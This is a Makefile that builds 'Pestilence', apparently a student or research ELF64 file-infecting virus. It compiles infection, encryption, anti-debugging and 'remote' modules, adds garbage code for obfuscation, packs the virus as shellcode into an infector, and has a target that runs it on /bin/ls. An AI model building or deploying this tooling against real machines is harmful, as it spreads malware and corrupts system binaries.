NAME = Pestilence

DEBUG=1

FLAGS = -MD -fno-stack-protector -fPIC -fPIE -Wextra -Wall -Ofast -fno-tree-loop-distribute-patterns -D DEBUG=$(DEBUG)

SRC_DIR				= .
TMP_DIR				= .tmp
OBJ_DIR				= $(TMP_DIR)/obj

TABLE_C = $(TMP_DIR)/table.c
LIBFLAGS = -I lib/infect -I lib/ft_lib -I lib/crypto -I lib/formats -I lib/hacks
VIRUS = virus

FTLIB_SRC = ft_io.c ft_string.c ft_lib.c
FORMATS_SRC = elf64.c
CRYPTO_SRC = tea_encrypt.c compress_use.c compress.c
HACKS_SRC = antidebug.c remote.c checkproc.c
INFECT_SRC = infect.c infect_dir.c

FTLIB = $(addprefix lib/ft_lib/, $(FTLIB_SRC))
FORMATS = $(addprefix lib/formats/, $(FORMATS_SRC))
CRYPTO = $(addprefix lib/crypto/, $(CRYPTO_SRC))
HACKS = $(addprefix lib/hacks/, $(HACKS_SRC))
INFECT = $(addprefix lib/infect/, $(INFECT_SRC))

OBJ_LIBS = $(addprefix $(OBJ_DIR)/, lib/ft_lib lib/ft_formats lib/crypto lib/hacks lib)

SRC_C = virus/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(HACKS) $(TABLE_C)
SRC_S = virus/start.s lib/crypto/tea_decrypt.s

OBJ	=	$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.o)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o)) \
		.tmp/obj/lib/ft_lib/call.o

SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO)

OBJ_INF	= $(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o)) \
		.tmp/obj/lib/ft_lib/call.o

DEP =		$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.d)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.d))

VIRUS = $(TMP_DIR)/virus.template
VIRUS_X = $(TMP_DIR)/virus_shellcode.c

LD_RULES = virus/rules.lds

all: $(NAME)

$(NAME): $(VIRUS_X) $(OBJ_INF)
	gcc -o $(NAME) $(OBJ_INF) $(VIRUS_X)

$(VIRUS_X): $(VIRUS)
	cp $< virus_shellcode
	xxd -i virus_shellcode $(VIRUS_X)
	rm virus_shellcode

$(VIRUS): $(OBJ) $(LD_RULES)
	ld -o $@ -T $(LD_RULES) $(OBJ)
	nm -n .tmp/virus.template | grep ' B \| b ' | diff - /dev/null || rm $(VIRUS)

$(TMP_DIR):
	mkdir -p $@

$(OBJ_DIR):
	mkdir -p $@
	python -c 'import os,sys;dirs=[ r for r,s,f in os.walk(".") if r != "."];[os.makedirs(os.path.join(sys.argv[1],i)) for i in dirs]' $(OBJ_DIR)/.
	rm -rf $(OBJ_DIR)/others

##
## GARBAGE CODE
##

GARBAGE_CF = $(TMP_DIR)/garbage.txt

$(GARBAGE_CF): $(TMP_DIR)
	echo "0" > $@

$(OBJ_DIR)/virus/main.s.g.s: $(OBJ_DIR)/virus/main.s $(GARBAGE_CF)
	./others/scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l decrypt do_infection entry virus

$(TABLE_C): $(GARBAGE_CF)
	./others/scripts/gen_garbage_table -n `cat $(GARBAGE_CF)` -o $@

$(OBJ_DIR)/%.o: $(OBJ_DIR)/%.s.g.s | $(OBJ_DIR)
	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@

$(OBJ_DIR)/%.s: $(SRC_DIR)/%.c | $(OBJ_DIR) $(TMP_LIB_DIR)
	gcc $(FLAGS) $(LIBFLAGS) -S $< -o $@

##
## END
##

$(OBJ_DIR)/%.o: %.c | $(OBJ_DIR)
	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@

$(OBJ_DIR)/%.o: %.s | $(OBJ_DIR)
	nasm -f elf64 $< -o $@

clean:
	rm -rf $(TMP_DIR)

fclean: clean
	rm -rf $(NAME)

re: fclean
	echo $(DEP)
	$(MAKE)

-include $(DEP)

.PHONY: all re clean fclean test unit_test

test: all
	(cd others/test && ./run.sh)

ls: all
	./$(NAME) /bin/ls
